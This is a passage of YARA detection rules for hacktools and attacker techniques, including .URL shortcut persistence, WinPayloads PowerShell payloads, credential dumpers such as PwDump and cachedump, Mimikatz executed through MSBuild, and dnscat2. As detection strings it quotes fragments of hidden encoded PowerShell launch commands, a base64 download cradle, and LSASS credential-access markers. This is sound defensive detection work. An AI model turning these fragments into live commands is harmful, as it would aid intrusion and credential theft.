//    $file2 = /IconFile=script:/ nocase
    $url_clsid = "[{000214A0-0000-0000-C000-000000000046}]"
    $url_explicit = "[InternetShortcut]" nocase
  condition:
    any of ($url*) and any of ($file*)
    and uint16(0) != 0x5A4D and uint32(0) != 0x464c457f and uint32(0) != 0xBEBAFECA and uint32(0) != 0xFEEDFACE and uint32(0) != 0xFEEDFACF and uint32(0) != 0xCEFAEDFE
    and filesize < 30KB
}

rule Methodology_Suspicious_Shortcut_WorkingDirRemote_HTTP
{
  meta:
    author = "@itsreallynick (Nick Carr)"
    description = "Detects possible shortcut usage for .URL persistence"
    reference = "https://twitter.com/cglyer/status/1176184798248919044"
    score = 50
    date = "27.09.2019"
  strings:
    $icon = "WorkingDirectory=http" nocase
    $url_clsid = "[{000214A0-0000-0000-C000-000000000046}]"
    $url_explicit = "[InternetShortcut]" nocase
  condition:
    $icon and any of ($url*)
    and uint16(0) != 0x5A4D and uint32(0) != 0x464c457f and uint32(0) != 0xBEBAFECA and uint32(0) != 0xFEEDFACE and uint32(0) != 0xFEEDFACF and uint32(0) != 0xCEFAEDFE
    and filesize < 30KB
}

rule Methodology_Suspicious_Shortcut_WorkingDirRemote_SMB
{
  meta:
    author = "@itsreallynick (Nick Carr)"
    description = "Detects possible shortcut usage for .URL persistence"
    reference = "https://twitter.com/cglyer/status/1176184798248919044"
    score = 50
    date = "27.09.2019"
  strings:
    $icon = "WorkingDirectory=file://" nocase
    $url_clsid = "[{000214A0-0000-0000-C000-000000000046}]"
    $url_explicit = "[InternetShortcut]" nocase
  condition:
    $icon and any of ($url*)
    and uint16(0) != 0x5A4D and uint32(0) != 0x464c457f and uint32(0) != 0xBEBAFECA and uint32(0) != 0xFEEDFACE and uint32(0) != 0xFEEDFACF and uint32(0) != 0xCEFAEDFE
    and filesize < 30KB
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-07-11
   Identifier: WinPayloads
   Reference: https://github.com/nccgroup/Winpayloads
*/

/* Rule Set ----------------------------------------------------------------- */

rule WinPayloads_PowerShell {
   meta:
      description = "Detects WinPayloads PowerShell Payload"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://github.com/nccgroup/Winpayloads"
      date = "2017-07-11"
      hash1 = "011eba8f18b66634f6eb47527b4ceddac2ae615d6861f89a35dbb9fc591cae8e"
   strings:
      $x1 = "$Base64Cert = 'MIIJeQIBAzCCCT8GCSqGSIb3DQEHAaCCCTAEggksMIIJKDCCA98GCSqGSIb3DQEHBqCCA9AwggPMAgEAMIIDxQYJKoZIhvcNAQcBMBwGCiqGSIb3D" ascii
      $x2 = "powershell -w hidden -noni -enc SQBF" fullword ascii nocase
      $x3 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwA" ascii
      $x4 = "powershell.exe -WindowStyle Hidden -enc JABjAGwAaQBlAG4AdAA" ascii
   condition:
      filesize < 10KB and 1 of them
}

rule WinPayloads_Payload {
   meta:
      description = "Detects WinPayloads Payload"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://github.com/nccgroup/Winpayloads"
      date = "2017-07-11"
      super_rule = 1
      hash1 = "23a24f99c3c6c00cd4bf6cb968f813ba2ceadfa846c7f169f412bcbb71ba6573"
      hash2 = "35069905d9b7ba1fd57c8df03614f563504194e4684f47aafa08ebb8d9409d0b"
      hash3 = "a28d107f168d85c38fc76229b14561b472e60e60973eb10b6b554c1f57469322"
      hash4 = "ed93e28ca18f749a78678b1e8e8ac31f4c6c0bab2376d398b413dbdfd5af9c7f"
      hash5 = "26f5aee1ce65158e8375deb63c27edabfc9f5de3c1c88a4ce26a7e50b315b6d8"
      hash6 = "b25a515706085dbde0b98deaf647ef9a8700604652c60c6b706a2ff83fdcbf45"
   strings:
      $s1 = "bpayload.exe.manifest" fullword ascii
      $s2 = "spayload" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and all of them )
}
/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-06-02
	Identifier: Win Privilege Escalation
*/

/* Rule Set ----------------------------------------------------------------- */

rule Win_PrivEsc_gp3finder_v4_0 {
	meta:
		description = "Detects a tool that can be used for privilege escalation - file gp3finder_v4.0.exe"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "http://grimhacker.com/2015/04/10/gp3finder-group-policy-preference-password-finder/"
		date = "2016-06-02"
		score = 80
		hash1 = "7d34e214ef2ca33516875fb91a72d5798f89b9ea8964d3990f99863c79530c06"
	strings:
		$x1 = "Check for and attempt to decrypt passwords on share" ascii
		$x2 = "Failed to auto get and decrypt passwords. {0}s/" fullword ascii
		$x3 = "GPPPFinder - Group Policy Preference Password Finder" fullword ascii
	condition:
		( uint16(0) == 0x5a4d and 1 of ($x*) ) or ( all of them )
}

rule Win_PrivEsc_folderperm {
	meta:
		description = "Detects a tool that can be used for privilege escalation - file folderperm.ps1"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "http://www.greyhathacker.net/?p=738"
		date = "2016-06-02"
		score = 80
		hash1 = "1aa87df34826b1081c40bb4b702750587b32d717ea6df3c29715eb7fc04db755"
	strings:
		$x1 = "# powershell.exe -executionpolicy bypass -file folderperm.ps1" fullword ascii
		$x2 = "Write-Host \"[i] Dummy test file used to test access was not outputted:\" $filetocopy" fullword ascii
		$x3 = "Write-Host -foregroundColor Red \"      Access denied :\" $myarray[$i] " fullword ascii
	condition:
		1 of them
}

rule Win_PrivEsc_ADACLScan4_3 {
	meta:
		description = "Detects a tool that can be used for privilege escalation - file ADACLScan4.3.ps1"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "https://adaclscan.codeplex.com/"
		score = 60
		date = "2016-06-02"
		hash1 = "3473ddb452de7640fab03cad3e8aaf6a527bdd6a7a311909cfef9de0b4b78333"
	strings:
		$s1 = "<Label x:Name=\"lblPort\" Content=\"Port:\"  HorizontalAlignment=\"Left\" Height=\"28\" Margin=\"10,0,0,0\" Width=\"35\"/>" fullword ascii
		$s2 = "(([System.IconExtractor]::Extract(\"mmcndmgr.dll\", 126, $true)).ToBitMap()).Save($env:temp + \"\\Other.png\")    " fullword ascii
		$s3 = "$bolValid = $ctx.ValidateCredentials($psCred.UserName,$psCred.GetNetworkCredential().Password)" fullword ascii
	condition:
		all of them
}
/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-03-24
   Identifier: WMImplant
*/

/* Rule Set ----------------------------------------------------------------- */

rule WMImplant {
   meta:
      description = "Auto-generated rule - file WMImplant.ps1"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2017/03/wmimplant_a_wmi_ba.html"
      date = "2017-03-24"
      hash1 = "860d7c237c2395b4f51b8c9bd0ee6cab06af38fff60ce3563d160d50c11d2f78"
   strings:
      $x1 = "Invoke-ProcessPunisher -Creds $RemoteCredential" fullword ascii
      $x2 = "$Target -query \"SELECT * FROM Win32_NTLogEvent WHERE (logfile='security')" ascii
      $x3 = "WMImplant -Creds" fullword ascii
      $x4 = "-Download -RemoteFile C:\\passwords.txt" ascii
      $x5 = "-Command 'powershell.exe -command \"Enable-PSRemoting" fullword ascii
      $x6 = "Invoke-WMImplant" fullword ascii
   condition:
      1 of them
}


rule CN_Toolset_NTscan_PipeCmd {
   meta:
      description = "Detects a Chinese hacktool from a disclosed toolset - file PipeCmd.exe"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "http://qiannao.com/ls/905300366/33834c0c/"
      date = "2015/03/30"
      score = 70
      hash = "a931d65de66e1468fe2362f7f2e0ee546f225c4e"
   strings:
      $s2 = "Please Use NTCmd.exe Run This Program." fullword ascii
      $s3 = "PipeCmd.exe" fullword wide
      $s4 = "\\\\.\\pipe\\%s%s%d" fullword ascii
      $s5 = "%s\\pipe\\%s%s%d" fullword ascii
      $s6 = "%s\\ADMIN$\\System32\\%s%s" fullword ascii
      $s7 = "%s\\ADMIN$\\System32\\%s" fullword ascii
      $s9 = "PipeCmdSrv.exe" fullword ascii
      $s10 = "This is a service executable! Couldn't start directly." fullword ascii
      $s13 = "\\\\.\\pipe\\PipeCmd_communicaton" fullword ascii
      $s14 = "PIPECMDSRV" fullword wide
      $s15 = "PipeCmd Service" fullword ascii
   condition:
      4 of them
}


rule DarkComet_Keylogger_File
{
   meta:
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      description = "Looks like a keylogger file created by DarkComet Malware"
      date = "25.07.14"
      score = 50
   strings:
      $entry = /\n:: [A-Z]/
      $timestamp = /\([0-9]?[0-9]:[0-9][0-9]:[0-9][0-9] [AP]M\)/
   condition:
      uint16(0) == 0x3A3A and #entry > 10 and #timestamp > 10
}



rule Netview_Hacktool {
   meta:
      description = "Network domain enumeration tool - often used by attackers - file Nv.exe"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://github.com/mubix/netview"
      date = "2016-03-07"
      score = 60
      hash = "52cec98839c3b7d9608c865cfebc904b4feae0bada058c2e8cdbd561cfa1420a"
   strings:
      $s1 = "[+] %ws - Target user found - %s\\%s" fullword wide
      $s2 = "[*] -g used without group specified - using \"Domain Admins\"" fullword ascii
      $s3 = "[*] -i used without interval specified - ignoring" fullword ascii
      $s4 = "[+] %ws - Session - %s from %s - Active: %d - Idle: %d" fullword wide
      $s5 = "[+] %ws - Backup Domain Controller" fullword wide
      $s6 = "[-] %ls - Share - Error: %ld" fullword wide
      $s7 = "[-] %ls - Session - Error: %ld" fullword wide
      $s8 = "[+] %s - OS Version - %d.%d" fullword ascii
      $s9 = "Enumerating Logged-on Users" fullword ascii
      $s10 = ": Specifies a domain to pull a list of hosts from" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 500KB and 2 of them ) or 3 of them
}

rule Netview_Hacktool_Output {
   meta:
      description = "Network domain enumeration tool output - often used by attackers - file filename.txt"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://github.com/mubix/netview"
      date = "2016-03-07"
      score = 60
   strings:
      $s1 = "[*] Using interval:" fullword
      $s2 = "[*] Using jitter:" fullword
      $s3 = "[+] Number of hosts:" fullword
   condition:
      2 of them
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2016-03-09
   Identifier: PSattack
*/

/* Rule Set ----------------------------------------------------------------- */

rule PSAttack_EXE {
   meta:
      description = "PSAttack - Powershell attack tool - file PSAttack.exe"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://github.com/gdssecurity/PSAttack/releases/"
      date = "2016-03-09"
      score = 100
      hash = "ad05d75640c850ee7eeee26422ba4f157be10a4e2d6dc6eaa19497d64cf23715"
   strings:
      $x1 = "\\Release\\PSAttack.pdb" fullword

      $s1 = "set-executionpolicy bypass -Scope process -Force" fullword wide
      $s2 = "PSAttack.Modules." ascii
      $s3 = "PSAttack.PSAttackProcessing" fullword ascii
      $s4 = "PSAttack.Modules.key.txt" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and ( $x1 or 2 of ($s*) ) ) or 3 of them
}

rule Powershell_Attack_Scripts {
   meta:
      description = "Powershell Attack Scripts"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      date = "2016-03-09"
      score = 70
   strings:
      $s1 = "PowershellMafia\\Invoke-Shellcode.ps1" ascii
      $s2 = "Nishang\\Do-Exfiltration.ps1" ascii
      $s3 = "PowershellMafia\\Invoke-Mimikatz.ps1" ascii
      $s4 = "Inveigh\\Inveigh.ps1" ascii
   condition:
      1 of them
}

rule PSAttack_ZIP {
   meta:
      description = "PSAttack - Powershell attack tool - file PSAttack.zip"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://github.com/gdssecurity/PSAttack/releases/"
      date = "2016-03-09"
      score = 100
      hash = "3864f0d44f90404be0c571ceb6f95bbea6c527bbfb2ec4a2b4f7d92e982e15a2"
   strings:
      $s0 = "PSAttack.exe" fullword ascii
   condition:
      uint16(0) == 0x4b50 and all of them
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2016-04-01
   Identifier: Linux Hacktool Shark
*/

/* Super Rules ------------------------------------------------------------- */

rule Linux_Portscan_Shark_1 {
   meta:
      description = "Detects Linux Port Scanner Shark"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Virustotal Research - see https://github.com/Neo23x0/Loki/issues/35"
      date = "2016-04-01"
      super_rule = 1
      hash1 = "4da0e535c36c0c52eaa66a5df6e070c52e7ddba13816efc3da5691ea2ec06c18"
      hash2 = "e395ca5f932419a4e6c598cae46f17b56eb7541929cdfb67ef347d9ec814dea3"
   strings:
      $s0 = "rm -rf scan.log session.txt" fullword ascii
      $s17 = "*** buffer overflow detected ***: %s terminated" fullword ascii
      $s18 = "*** stack smashing detected ***: %s terminated" fullword ascii
   condition:
      ( uint16(0) == 0x7362 and all of them )
}

rule Linux_Portscan_Shark_2 {
   meta:
      description = "Detects Linux Port Scanner Shark"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Virustotal Research - see https://github.com/Neo23x0/Loki/issues/35"
      date = "2016-04-01"
      super_rule = 1
      hash1 = "5f80bd2db608a47e26290f3385eeb5bfc939d63ba643f06c4156704614def986"
      hash2 = "90af44cbb1c8a637feda1889d301d82fff7a93b0c1a09534909458a64d8d8558"
   strings:
      $s1 = "usage: %s <fisier ipuri> <fisier useri:parole> <connect timeout> <fail2ban wait> <threads> <outfile> <port>" fullword ascii
      $s2 = "Difference between server modulus and host modulus is only %d. It's illegal and may not work" fullword ascii
      $s3 = "rm -rf scan.log" fullword ascii
   condition:
      all of them
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2016-05-15
   Identifier: dnscat2
*/

rule dnscat2_Hacktool {
   meta:
      description = "Detects dnscat2 - from files dnscat, dnscat2.exe"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://downloads.skullsecurity.org/dnscat2/"
      date = "2016-05-15"
      super_rule = 1
      hash1 = "8bc8d6c735937c9c040cbbdcfc15f17720a7ecef202a19a7bf43e9e1c66fe66a"
      hash2 = "4a882f013419695c8c0ac41d8a0fde1cf48172a89e342c504138bc6f1d13c7c8"
   strings:
      $s1 = "--exec -e <process>     Execute the given process and link it to the stream." fullword ascii
      $s2 = "Sawlog" fullword ascii
      $s3 = "COMMAND_EXEC [request] :: request_id: 0x%04x :: name: %s :: command: %s" fullword ascii
      $s4 = "COMMAND_SHELL [request] :: request_id: 0x%04x :: name: %s" fullword ascii
      $s5 = "[Tunnel %d] connection to %s:%d closed by the server!" fullword ascii
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 400KB and ( 2 of ($s*) ) ) or ( all of them )
}

rule WCE_in_memory {
   meta:
      description = "Detects Windows Credential Editor (WCE) in memory (and also on disk)"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      score = 80
      date = "2016-08-28"
   strings:
      $s1 = "wkKUSvflehHr::o:t:s:c:i:d:a:g:" fullword ascii
      $s2 = "wceaux.dll" fullword ascii
   condition:
      all of them
}

rule pstgdump {
   meta:
      description = "Detects a tool used by APT groups - file pstgdump.exe"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "http://goo.gl/igxLyF"
      date = "2016-09-08"
      hash1 = "65d48a2f868ff5757c10ed796e03621961954c523c71eac1c5e044862893a106"
   strings:
      $x1 = "\\Release\\pstgdump.pdb" ascii
      $x2 = "Failed to dump all protected storage items - see previous messages for details" fullword ascii
      $x3 = "ptsgdump [-h][-q][-u Username][-p Password]" fullword ascii
      $x4 = "Attempting to impersonate domain user '%s' in domain '%s'" fullword ascii
      $x5 = "Failed to impersonate user (ImpersonateLoggedOnUser failed): error %d" fullword ascii
      $x6 = "Unable to obtain handle to PStoreCreateInstance in pstorec.dll" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and 1 of ($x*) ) or ( 3 of them )
}

rule lsremora {
   meta:
      description = "Detects a tool used by APT groups"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "http://goo.gl/igxLyF"
      date = "2016-09-08"
      hash1 = "efa66f6391ec471ca52cd053159c8a8778f11f921da14e6daf76387f8c9afcd5"
      hash2 = "e0327c1218fd3723e20acc780e20135f41abca35c35e0f97f7eccac265f4f44e"
   strings:
      $x1 = "Target: Failed to load primary SAM functions." fullword ascii
      $x2 = "lsremora64.dll" fullword ascii
      $x3 = "PwDumpError:999999" fullword wide
      $x4 = "PwDumpError" fullword wide
      $x5 = "lsremora.dll" fullword ascii

      $s1 = ":\\\\.\\pipe\\%s" fullword ascii
      $s2 = "x%s_history_%d:%d" fullword wide
      $s3 = "Using pipe %s" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and 1 of ($x*) ) or ( 3 of them )
}

rule servpw {
   meta:
      description = "Detects a tool used by APT groups - file servpw.exe"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "http://goo.gl/igxLyF"
      date = "2016-09-08"
      hash1 = "97b39ac28794a7610ed83ad65e28c605397ea7be878109c35228c126d43e2f46"
      hash2 = "0f340b471ef34c69f5413540acd3095c829ffc4df38764e703345eb5e5020301"
   strings:
      $s1 = "Unable to open target process: %d, pid %d" fullword ascii
      $s2 = "LSASS.EXE" fullword wide
      $s3 = "WriteProcessMemory failed: %d" fullword ascii
      $s4 = "lsremora64.dll" fullword ascii
      $s5 = "CreateRemoteThread failed: %d" fullword ascii
      $s6 = "Thread code: %d, path: %s" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and 3 of them ) or ( all of them )
}

rule fgexec {
   meta:
      description = "Detects a tool used by APT groups - file fgexec.exe"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "http://goo.gl/igxLyF"
      date = "2016-09-08"
      hash1 = "8697897bee415f213ce7bc24f22c14002d660b8aaffab807490ddbf4f3f20249"
   strings:
      $x1 = "\\Release\\fgexec.pdb" ascii
      $x2 = "fgexec Remote Process Execution Tool" fullword ascii
      $x3 = "fgexec CallNamedPipe failed" fullword ascii
      $x4 = "fizzgig and the mighty foofus.net team" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and 1 of ($x*) ) or ( 3 of them )
}

rule cachedump {
   meta:
      description = "Detects a tool used by APT groups - from files cachedump.exe, cachedump64.exe"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "http://goo.gl/igxLyF"
      date = "2016-09-08"
      super_rule = 1
      hash1 = "cf58ca5bf8c4f87bb67e6a4e1fb9e8bada50157dacbd08a92a4a779e40d569c4"
      hash2 = "e38edac8c838a043d0d9d28c71a96fe8f7b7f61c5edf69f1ce0c13e141be281f"
   strings:
      $s1 = "Failed to open key SECURITY\\Cache in RegOpenKeyEx. Is service running as SYSTEM ? Do you ever log on domain ? " fullword ascii
      $s2 = "Unable to open LSASS.EXE process" fullword ascii
      $s3 = "Service not found. Installing CacheDump Service (%s)" fullword ascii
      $s4 = "CacheDump service successfully installed." fullword ascii
      $s5 = "Kill CacheDump service (shouldn't be used)" fullword ascii
      $s6 = "cacheDump [-v | -vv | -K]" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 500KB and 1 of them ) or ( 3 of them )
}

rule PwDump_B {
   meta:
      description = "Detects a tool used by APT groups - file PwDump.exe"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "http://goo.gl/igxLyF"
      date = "2016-09-08"
      hash1 = "3c796092f42a948018c3954f837b4047899105845019fce75a6e82bc99317982"
   strings:
      $x1 = "Usage: %s [-x][-n][-h][-o output_file][-u user][-p password][-s share] machineName" fullword ascii
      $x2 = "pwdump6 Version %s by fizzgig and the mighty group at foofus.net" fullword ascii
      $x3 = "where -x targets a 64-bit host" fullword ascii
      $x4 = "Couldn't delete target executable from remote machine: %d" fullword ascii

      $s1 = "lsremora64.dll" fullword ascii
      $s2 = "lsremora.dll" fullword ascii
      $s3 = "servpw.exe" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 400KB and 1 of ($x*) ) or ( 3 of them )
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2016-10-07
   Identifier: MSBuild Katz-XML
*/

/* Rule Set ----------------------------------------------------------------- */

rule MSBuild_Mimikatz_Execution_via_XML {
   meta:
      description = "Detects an XML that executes Mimikatz on an endpoint via MSBuild"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://gist.github.com/subTee/c98f7d005683e616560bda3286b6a0d8#file-katz-xml"
      date = "2016-10-07"
   strings:
      $x1 = "<Project ToolsVersion=" ascii
      $x2 = "</SharpLauncher>" fullword ascii

      $s1 = "\"TVqQAAMAAAA" ascii
      $s2 = "System.Convert.FromBase64String(" ascii
      $s3 = ".Invoke(" ascii
      $s4 = "Assembly.Load(" ascii
      $s5 = ".CreateInstance(" ascii
   condition:
      all of them
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-01-06
   Identifier: Fscan
*/

/* Rule Set ----------------------------------------------------------------- */

rule Fscan_Portscanner {
   meta:
      description = "Fscan port scanner scan output / strings"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://twitter.com/JamesHabben/status/817112447970480128"
      date = "2017-01-06"
   strings:
      $s1 = "Time taken:" fullword ascii
      $s2 = "Scan finished at" fullword ascii
      $s3 = "Scan started at" fullword ascii
   condition:
      filesize < 20KB and 3 of them
}


/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-03-15
   Identifier: Windows Password Recovery
*/

/* Rule Set ----------------------------------------------------------------- */

rule WPR_loader_EXE {
   meta:
      description = "Windows Password Recovery - file loader.exe"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-03-15"
      hash1 = "e7d158d27d9c14a4f15a52ee5bf8aa411b35ad510b1b93f5e163ae7819c621e2"
   strings:
      $s1 = "Failed to get system process ID" fullword wide
      $s2 = "gLSASS.EXE" fullword wide
      $s3 = "WriteProcessMemory failed" fullword wide
      $s4 = "wow64 process NOT created" fullword wide
      $s5 = "\\ast.exe" fullword wide
      $s6 = "Exit code=%s, status=%d" fullword wide
      $s7 = "VirtualProtect failed" fullword wide
      $s8 = "nSeDebugPrivilege" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and 3 of them )
}

rule WPR_loader_DLL {
   meta:
      description = "Windows Password Recovery - file loader64.dll"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-03-15"
      hash1 = "7b074cb99d45fc258e0324759ee970467e0f325e5d72c0b046c4142edc6776f6"
      hash2 = "a1f27f7fd0e03601a11b66d17cfacb202eacf34f94de3c4e9d9d39ea8d1a2612"
   strings:
      $x1 = "loader64.dll" fullword ascii
      $x2 = "loader.dll" fullword ascii

      $s1 = "TUlDUk9TT0ZUX0FVVEhFTlRJQ0FUSU9OX1BBQ0tBR0VfVjFfMA==" fullword ascii /* base64 encoded string 'MICROSOFT_AUTHENTICATION_PACKAGE_V1_0' */
      $s2 = "UmVtb3RlRGVza3RvcEhlbHBBc3Npc3RhbnRBY2NvdW50" fullword ascii /* base64 encoded string 'RemoteDesktopHelpAssistantAccount' */
      $s3 = "U2FtSVJldHJpZXZlUHJpbWFyeUNyZWRlbnRpYWxz" fullword ascii /* base64 encoded string 'SamIRetrievePrimaryCredentials' */
      $s4 = "VFM6SW50ZXJuZXRDb25uZWN0b3JQc3dk" fullword ascii /* base64 encoded string 'TS:InternetConnectorPswd' */
      $s5 = "TCRVRUFjdG9yQWx0Q3JlZFByaXZhdGVLZXk=" fullword ascii /* base64 encoded string 'L$UEActorAltCredPrivateKey' */
      $s6 = "YXNwbmV0X1dQX1BBU1NXT1JE" fullword ascii /* base64 encoded string 'aspnet_WP_PASSWORD' */
      $s7 = "TCRBTk1fQ1JFREVOVElBTFM=" fullword ascii /* base64 encoded string 'L$ANM_CREDENTIALS' */
      $s8 = "RGVmYXVsdFBhc3N3b3Jk" fullword ascii /* base64 encoded string 'DefaultPassword' */

      $op0 = { 48 8b cd e8 e0 e8 ff ff 48 89 07 48 85 c0 74 72 } /* Opcode */
      $op1 = { e8 ba 23 00 00 33 c9 ff 15 3e 82 } /* Opcode */
      $op2 = { 48 83 c4 28 e9 bc 55 ff ff 48 8d 0d 4d a7 00 00 } /* Opcode */
   condition:
      uint16(0) == 0x5a4d and
      filesize < 400KB and
      (
         ( 1 of ($x*) and 1 of ($s*) ) or
         ( 1 of ($s*) and all of ($op*) )
      )
}

rule WPR_Passscape_Loader {
   meta:
      description = "Windows Password Recovery - file ast.exe"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-03-15"
      hash1 = "f6f2d4b9f19f9311ec419f05224a1c17cf2449f2027cb7738294479eea56e9cb"
   strings:
      $s1 = "SYSTEM\\CurrentControlSet\\Services\\PasscapeLoader64" fullword wide
      $s2 = "ast64.dll" fullword ascii
      $s3 = "\\loader64.exe" fullword wide
      $s4 = "Passcape 64-bit Loader Service" fullword wide
      $s5 = "PasscapeLoader64" fullword wide
      $s6 = "ast64 {msg1GkjN7Sh8sg2Al7ker63f}" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and 2 of them )
}

rule WPR_Asterisk_Hook_Library {
   meta:
      description = "Windows Password Recovery - file ast64.dll"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-03-15"
      hash1 = "225071140e170a46da0e57ce51f0838f4be00c8f14e9922c6123bee4dffde743"
      hash2 = "95ec84dc709af990073495082d30309c42d175c40bd65cad267e6f103852a02d"
   strings:
      $s1 = "ast64.dll" fullword ascii
      $s2 = "ast.dll" fullword wide
      $s3 = "c:\\%s.lvc" fullword ascii
      $s4 = "c:\\%d.lvc" fullword ascii
      $s5 = "Asterisk Hook Library" fullword wide
      $s6 = "?Ast_StartRd64@@YAXXZ" fullword ascii
      $s7 = "Global\\{1374821A-281B-9AF4-%04X-12345678901234}" fullword ascii
      $s8 = "2004-2013 Passcape Software" fullword wide
      $s9 = "Global\\Passcape#6712%04X" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and 3 of them )
}

rule WPR_WindowsPasswordRecovery_EXE {
   meta:
      description = "Windows Password Recovery - file wpr.exe"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-03-15"
      hash1 = "c1c64cba5c8e14a1ab8e9dd28828d036581584e66ed111455d6b4737fb807783"
   strings:
      $x1 = "UuPipe" fullword ascii
      $x2 = "dbadllgl" fullword ascii
      $x3 = "UkVHSVNUUlkgTU9O" fullword ascii /* base64 encoded string 'REGISTRY MON' */
      $x4 = "RklMRSBNT05JVE9SIC0gU1l" fullword ascii /* base64 encoded string 'FILE MONITOR - SY' */

      $s1 = "WPR.exe" fullword wide
      $s2 = "Windows Password Recovery" fullword wide

      $op0 = { 5f df 27 17 89 } /* Opcode */
      $op1 = { 5f 00 00 f2 e5 cb 97 } /* Opcode */
      $op2 = { e8 ed 00 f0 cc e4 00 a0 17 } /* Opcode */
   condition:
      uint16(0) == 0x5a4d and
      filesize < 20000KB and
      (
         1 of ($x*) or
         all of ($s*) or
         all of ($op*)
      )
}

rule WPR_WindowsPasswordRecovery_EXE_64 {
   meta:
      description = "Windows Password Recovery - file ast64.exe"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-03-15"
      hash1 = "4e1ea81443b34248c092b35708b9a19e43a1ecbdefe4b5180d347a6c8638d055"
   strings:
      $s1 = "%B %d %Y  -  %H:%M:%S" fullword wide

      $op0 = { 48 8d 8c 24 50 22 00 00 e8 bf eb ff ff 4c 8b c7 } /* Opcode */
      $op1 = { ff 15 16 25 01 00 f7 d8 1b } /* Opcode */
      $op2 = { e8 c2 26 00 00 83 20 00 83 c8 ff 48 8b 5c 24 30 } /* Opcode */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and all of them )
}


/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-03-17
   Identifier: BeyondExec Remote Access Tool
*/

/* Rule Set ----------------------------------------------------------------- */

rule BeyondExec_RemoteAccess_Tool {
   meta:
      description = "Detects BeyondExec Remote Access Tool - file rexesvr.exe"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://goo.gl/BvYurS"
      date = "2017-03-17"
      hash1 = "3d3e3f0708479d951ab72fa04ac63acc7e5a75a5723eb690b34301580747032c"
   strings:
      $x1 = "\\BeyondExecV2\\Server\\Release\\Pipes.pdb" ascii
      $x2 = "\\\\.\\pipe\\beyondexec%d-stdin" fullword ascii
      $x3 = "Failed to create dispatch pipe. Do you have another instance running?" fullword ascii

